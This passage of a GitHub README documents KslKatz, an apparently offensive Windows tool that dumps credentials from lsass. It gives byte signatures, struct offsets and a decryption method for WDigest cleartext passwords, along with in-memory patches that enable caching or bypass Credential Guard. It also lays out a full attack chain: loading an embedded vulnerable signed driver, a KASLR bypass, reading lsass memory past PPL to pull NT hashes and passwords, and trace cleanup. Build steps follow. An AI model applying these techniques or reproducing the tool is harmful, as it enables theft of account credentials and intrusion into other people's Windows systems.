+<div class="markdown-heading" dir="auto"><h3 tabindex="-1" class="heading-element" dir="auto">WDigest Cleartext Extraction</h3><a id="user-content-wdigest-cleartext-extraction" class="anchor" aria-label="Permalink: WDigest Cleartext Extraction" href="https://github.com/k3nundrum/KslKatz#wdigest-cleartext-extraction"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">WDigest is an older HTTP Digest authentication protocol. When enabled, <code>wdigest.dll</code> caches plaintext passwords in an internal doubly-linked list called <code>l_LogSessList</code> so they can be reused for subsequent authentications.</p>
+<p dir="auto">KslKatz locates <code>l_LogSessList</code> by reading <code>wdigest.dll</code> from disk and scanning for the signature pattern:</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>Disassembly at the signature location:
+
+  48 8d 0d xx xx xx xx    lea  rcx, [rip+disp32]    ; rcx = &amp;l_LogSessList
+  48 3b d9                cmp  rbx, rcx              ; &lt;-- signature: 48 3b d9 74
+  74 xx                   je   short skip
+
+The disp32 displacement is at signature_offset - 4 in the raw .text bytes.
+target_rva = text_virtual_address + signature_offset + disp32
+l_LogSessList_va = wdigest_base_in_lsass + target_rva
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="Disassembly at the signature location:
+
+  48 8d 0d xx xx xx xx    lea  rcx, [rip+disp32]    ; rcx = &amp;l_LogSessList
+  48 3b d9                cmp  rbx, rcx              ; <-- signature: 48 3b d9 74
+  74 xx                   je   short skip
+
+The disp32 displacement is at signature_offset - 4 in the raw .text bytes.
+target_rva = text_virtual_address + signature_offset + disp32
+l_LogSessList_va = wdigest_base_in_lsass + target_rva" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">The list structure:</p>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>l_LogSessList (Head)
+  |
+  Flink -&gt; KIWI_WDIGEST_LIST_ENTRY
+    +0x00: Flink                          -&gt; next entry
+    +0x08: Blink                          -&gt; previous entry
+    +0x10: UsageCount (ULONG)
+    +0x18: This (self-pointer)
+    +0x20: LUID (logon session ID)
+    +0x28: (unknown/reserved)
+    +0x30: Username (UNICODE_STRING)      -&gt; e.g. "admin"
+    +0x40: Domain (UNICODE_STRING)        -&gt; e.g. "YOURDOM"
+    +0x50: Password (UNICODE_STRING)      -&gt; encrypted cleartext password
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="l_LogSessList (Head)
+  |
+  Flink -> KIWI_WDIGEST_LIST_ENTRY
+    +0x00: Flink                          -> next entry
+    +0x08: Blink                          -> previous entry
+    +0x10: UsageCount (ULONG)
+    +0x18: This (self-pointer)
+    +0x20: LUID (logon session ID)
+    +0x28: (unknown/reserved)
+    +0x30: Username (UNICODE_STRING)      -> e.g. &quot;admin&quot;
+    +0x40: Domain (UNICODE_STRING)        -> e.g. &quot;YOURDOM&quot;
+    +0x50: Password (UNICODE_STRING)      -> encrypted cleartext password" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">The password at offset <code>+0x50</code> is encrypted with <strong>3DES-CBC</strong> using the same <code>h3DesKey</code> and <code>IV[:8]</code> extracted during LSA key extraction. After decryption, the result is the plaintext password as a UTF-16LE string.</p>
+<p dir="auto">For machine accounts (username ending with <code>$</code>), the decrypted password is a binary blob rather than readable text. KslKatz outputs these as hex strings.</p>
+<details>
+<summary><b>When is WDigest caching active?</b></summary>
+<p dir="auto">WDigest cleartext caching is controlled by <code>g_fParameter_UseLogonCredential</code> inside the loaded <code>wdigest.dll</code>. This variable can be set through multiple paths:</p>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Persistence</th>
+<th>Detection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Registry: <code>HKLM\...\WDigest\UseLogonCredential = 1</code></td>
+<td>Survives reboot</td>
+<td>Easily auditable</td>
+</tr>
+<tr>
+<td>Group Policy</td>
+<td>Survives reboot</td>
+<td>GPO audit trail</td>
+</tr>
+<tr>
+<td>In-memory patch of <code>g_fParameter_UseLogonCredential</code> to 1</td>
+<td>Until reboot</td>
+<td>No registry artifact</td>
+</tr>
+<tr>
+<td>In-memory patch of <code>g_IsCredGuardEnabled</code> to 0</td>
+<td>Until reboot</td>
+<td>Bypasses Credential Guard check</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">On Windows 10+ the default is <code>UseLogonCredential=0</code> (caching disabled). On Windows 7/8, the default is enabled.</p>
+<p dir="auto">KslKatz <strong>always attempts WDigest extraction</strong> regardless of the registry value, because the in-memory state may differ from what the registry says (e.g., after in-memory patching via tools like NativeBypassCredGuard). If <code>l_LogSessList</code> is empty or unmapped, KslKatz reports this without error.</p>
+</details>
+<hr>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Attack Chain</h2><a id="user-content-attack-chain" class="anchor" aria-label="Permalink: Attack Chain" href="https://github.com/k3nundrum/KslKatz#attack-chain"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<div class="snippet-clipboard-content notranslate position-relative overflow-auto"><pre class="notranslate"><code>                                 KslKatz Execution Flow
+ +------------------------------------------------------------------------+
+ |                                                                        |
+ |  1. DRIVER SETUP                                                       |
+ |     Check drivers\KslD.sys (SHA256) -&gt; found? use it                   |
+ |     Check drivers\vKslD.sys (SHA256) -&gt; found? use it                  |
+ |     Neither? -&gt; deploy from embedded payload, verify SHA256             |
+ |     ChangeServiceConfigW(ImagePath = vulnerable driver)                |
+ |     RegSetValueEx(AllowedProcessName = our NT device path)             |
+ |     StartServiceW(KslD) -&gt; CreateFileW("\\.\KslD")                     |
+ |                                                                        |
+ |  2. KASLR BYPASS                                                       |
+ |     SubCmd 2 -&gt; IDTR base address + CR3                                |
+ |     Read IDT entries -&gt; find lowest ISR address                        |
+ |     Scan backwards (page-aligned) for MZ header -&gt; ntoskrnl base       |
+ |                                                                        |
+ |  3. EPROCESS DISCOVERY                                                 |
+ |     OpenProcess(PID 4) -&gt; NtQuerySystemInformation(HandleInfo)         |
+ |     -&gt; SYSTEM EPROCESS kernel address                                  |
+ |     Detect PID/Links/Name offsets dynamically from SYSTEM EPROCESS     |
+ |     Walk ActiveProcessLinks -&gt; find lsass.exe                          |
+ |     Read DTB from EPROCESS+0x28, auto-detect PEB offset               |
+ |                                                                        |
+ |  4. LSA KEY EXTRACTION                                                 |
+ |     ReadFile(lsasrv.dll) -&gt; local .text signature scan                 |
+ |     RIP-relative RVA resolution -&gt; 3 targeted physical reads           |
+ |     BCRYPT_HANDLE_KEY -&gt; BCRYPT_KEY81 -&gt; HARD_KEY -&gt; AES + 3DES + IV   |
+ |                                                                        |
+ |  5. MSV1_0 EXTRACTION                                                  |
+ |     ReadFile(lsasrv.dll) -&gt; local scan for LogonSessionList            |
+ |     Walk linked list via physical reads                                |
+ |     Decrypt Primary credentials -&gt; NT / LM / SHA1 hashes              |
+ |                                                                        |
+ |  6. WDIGEST EXTRACTION                                                 |
+ |     ReadFile(wdigest.dll) -&gt; local scan for l_LogSessList              |
+ |     Walk linked list via physical reads                                |
+ |     3DES-CBC decrypt -&gt; cleartext passwords                            |
+ |                                                                        |
+ |  7. CLEANUP                                                            |
+ |     ChangeServiceConfigW(original ImagePath)                           |
+ |     RegSetValueEx(original AllowedProcessName)                         |
+ |     StartServiceW (restore original driver state)                      |
+ |     DeleteFileW(vKslD.sys) if we deployed it                           |
+ |                                                                        |
+ +------------------------------------------------------------------------+
+</code></pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="                                 KslKatz Execution Flow
+ +------------------------------------------------------------------------+
+ |                                                                        |
+ |  1. DRIVER SETUP                                                       |
+ |     Check drivers\KslD.sys (SHA256) -> found? use it                   |
+ |     Check drivers\vKslD.sys (SHA256) -> found? use it                  |
+ |     Neither? -> deploy from embedded payload, verify SHA256             |
+ |     ChangeServiceConfigW(ImagePath = vulnerable driver)                |
+ |     RegSetValueEx(AllowedProcessName = our NT device path)             |
+ |     StartServiceW(KslD) -> CreateFileW(&quot;\\.\KslD&quot;)                     |
+ |                                                                        |
+ |  2. KASLR BYPASS                                                       |
+ |     SubCmd 2 -> IDTR base address + CR3                                |
+ |     Read IDT entries -> find lowest ISR address                        |
+ |     Scan backwards (page-aligned) for MZ header -> ntoskrnl base       |
+ |                                                                        |
+ |  3. EPROCESS DISCOVERY                                                 |
+ |     OpenProcess(PID 4) -> NtQuerySystemInformation(HandleInfo)         |
+ |     -> SYSTEM EPROCESS kernel address                                  |
+ |     Detect PID/Links/Name offsets dynamically from SYSTEM EPROCESS     |
+ |     Walk ActiveProcessLinks -> find lsass.exe                          |
+ |     Read DTB from EPROCESS+0x28, auto-detect PEB offset               |
+ |                                                                        |
+ |  4. LSA KEY EXTRACTION                                                 |
+ |     ReadFile(lsasrv.dll) -> local .text signature scan                 |
+ |     RIP-relative RVA resolution -> 3 targeted physical reads           |
+ |     BCRYPT_HANDLE_KEY -> BCRYPT_KEY81 -> HARD_KEY -> AES + 3DES + IV   |
+ |                                                                        |
+ |  5. MSV1_0 EXTRACTION                                                  |
+ |     ReadFile(lsasrv.dll) -> local scan for LogonSessionList            |
+ |     Walk linked list via physical reads                                |
+ |     Decrypt Primary credentials -> NT / LM / SHA1 hashes              |
+ |                                                                        |
+ |  6. WDIGEST EXTRACTION                                                 |
+ |     ReadFile(wdigest.dll) -> local scan for l_LogSessList              |
+ |     Walk linked list via physical reads                                |
+ |     3DES-CBC decrypt -> cleartext passwords                            |
+ |                                                                        |
+ |  7. CLEANUP                                                            |
+ |     ChangeServiceConfigW(original ImagePath)                           |
+ |     RegSetValueEx(original AllowedProcessName)                         |
+ |     StartServiceW (restore original driver state)                      |
+ |     DeleteFileW(vKslD.sys) if we deployed it                           |
+ |                                                                        |
+ +------------------------------------------------------------------------+" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<hr>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Embedded Driver</h2><a id="user-content-embedded-driver" class="anchor" aria-label="Permalink: Embedded Driver" href="https://github.com/k3nundrum/KslKatz#embedded-driver"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto">KslKatz embeds the vulnerable 333KB KslD.sys directly as a compiled-in C array (<code>driver_payload.h</code>). This makes the tool fully standalone with no external file dependencies.</p>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Priority</th>
+<th>Path</th>
+<th>Condition</th>
+<th>Action</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>drivers\KslD.sys</code></td>
+<td>Exists, size=333216, SHA256 match</td>
+<td>Use directly, no file written</td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>drivers\vKslD.sys</code></td>
+<td>Exists, size=333216, SHA256 match</td>
+<td>Use directly, no file written</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Embedded payload</td>
+<td>Neither found</td>
+<td>Write to <code>vKslD.sys</code>, verify SHA256, delete on cleanup</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<p dir="auto">Driver SHA256: <code>bd17231833aa369b3b2b6963899bf05dbefd673db270aec15446f2fab4a17b5a</code></p>
+<hr>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Comparison with Other Tools</h2><a id="user-content-comparison-with-other-tools" class="anchor" aria-label="Permalink: Comparison with Other Tools" href="https://github.com/k3nundrum/KslKatz#comparison-with-other-tools"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>KslKatz</th>
+<th>GhostKatz</th>
+<th>Mimikatz</th>
+<th>KernelKatz</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Driver</td>
+<td>Microsoft-signed KslD.sys</td>
+<td>Third-party vuln drivers</td>
+<td>None (usermode)</td>
+<td>Third-party vuln drivers</td>
+</tr>
+<tr>
+<td>Read primitive</td>
+<td><code>MmCopyMemory</code> via IOCTL</td>
+<td>Byte-by-byte phys read</td>
+<td><code>OpenProcess</code> + <code>ReadProcessMemory</code></td>
+<td>Kernel read</td>
+</tr>
+<tr>
+<td>PPL bypass</td>
+<td>Yes (physical reads)</td>
+<td>Yes (physical reads)</td>
+<td>No (blocked by PPL)</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Address translation</td>
+<td>Page table walk</td>
+<td>Superfetch PFN database</td>
+<td>N/A (usermode)</td>
+<td>Varies</td>
+</tr>
+<tr>
+<td>Signature scan</td>
+<td>Local file read (no ETW)</td>
+<td><code>LoadLibrary</code> (ETW event)</td>
+<td>In-process</td>
+<td>Varies</td>
+</tr>
+<tr>
+<td>EPROCESS discovery</td>
+<td>Handle table leak</td>
+<td><code>PsInitialSystemProcess</code> export</td>
+<td><code>OpenProcess</code></td>
+<td>Varies</td>
+</tr>
+<tr>
+<td>MSV1_0 hashes</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>WDigest cleartext</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Varies</td>
+</tr>
+<tr>
+<td>Standalone EXE</td>
+<td>Yes (embedded driver)</td>
+<td>No (BOF + driver file)</td>
+<td>Yes</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Cleanup</td>
+<td>Full restore (SCM + registry)</td>
+<td>Service delete</td>
+<td>N/A</td>
+<td>Varies</td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<hr>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Supported Windows Versions</h2><a id="user-content-supported-windows-versions" class="anchor" aria-label="Permalink: Supported Windows Versions" href="https://github.com/k3nundrum/KslKatz#supported-windows-versions"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<markdown-accessiblity-table data-catalyst=""><table>
+<thead>
+<tr>
+<th>Version</th>
+<th>Build</th>
+<th>MSV1_0</th>
+<th>WDigest</th>
+<th>Tested</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Windows 7</td>
+<td>7600</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+<td>WDigest enabled by default</td>
+</tr>
+<tr>
+<td>Windows 8</td>
+<td>9200</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+<td>WDigest enabled by default</td>
+</tr>
+<tr>
+<td>Windows 8.1</td>
+<td>9600</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+<td>WDigest enabled by default</td>
+</tr>
+<tr>
+<td>Windows 10 1507-1607</td>
+<td>10240-14393</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+<td>WDigest disabled by default</td>
+</tr>
+<tr>
+<td>Windows 10 1703</td>
+<td>15063</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+<td></td>
+</tr>
+<tr>
+<td>Windows 10 1803</td>
+<td>17134</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+<td></td>
+</tr>
+<tr>
+<td>Windows 10 1809-1909</td>
+<td>17763-18363</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+<td></td>
+</tr>
+<tr>
+<td>Windows 10 2004-22H2</td>
+<td>19041-19045</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+<td></td>
+</tr>
+<tr>
+<td>Windows Server 2022</td>
+<td>20348</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+<td></td>
+</tr>
+<tr>
+<td>Windows 11 21H2-23H2</td>
+<td>22000-22631</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+<td></td>
+</tr>
+<tr>
+<td>Windows 11 24H2/25H2</td>
+<td>26100-26200</td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+<td></td>
+</tr>
+</tbody>
+</table></markdown-accessiblity-table>
+<a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/66ee6c2e-4902-4ba3-bb63-4fc4a6203a0a"><img width="1947" height="955" alt="image" src="https://github.com/user-attachments/assets/66ee6c2e-4902-4ba3-bb63-4fc4a6203a0a" style="max-width: 100%; height: auto; max-height: 955px;; aspect-ratio: 1947 / 955; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a>
+<blockquote>
+<p dir="auto"><strong>Note:</strong> The vulnerable 333KB KslD.sys must be present on the target system or will be deployed from the embedded payload. Systems freshly installed with recent Defender versions may only have the patched 82KB version in <code>drivers\wd\</code>.</p>
+</blockquote>
+<hr>
+<div class="markdown-heading" dir="auto"><h2 tabindex="-1" class="heading-element" dir="auto">Building</h2><a id="user-content-building" class="anchor" aria-label="Permalink: Building" href="https://github.com/k3nundrum/KslKatz#building"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
+<p dir="auto"><strong>Requirements:</strong> Visual Studio 2022, C++20 (MSVC v143 toolset), Windows SDK 10.0</p>
+<div class="highlight highlight-source-shell notranslate position-relative overflow-auto" dir="auto"><pre>git clone https://github.com/S1lky/KslKatz.git
+<span class="pl-c1">cd</span> KslKatz</pre><div class="zeroclipboard-container">
+    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w" value="git clone https://github.com/S1lky/KslKatz.git
+cd KslKatz" tabindex="0" role="button">
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
+    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
+</svg>
+      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
+    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
+</svg>
+    </clipboard-copy>
+  </div></div>
+<p dir="auto">Open <code>KslKatz.sln</code> in Visual Studio 2022. Select <strong>x64 Release</strong>. Build.</p>
+<p dir="auto">Output: <code>bin\Release\KslKatz.exe</code> (~700KB standalone, no runtime dependencies)</p>
+<hr>
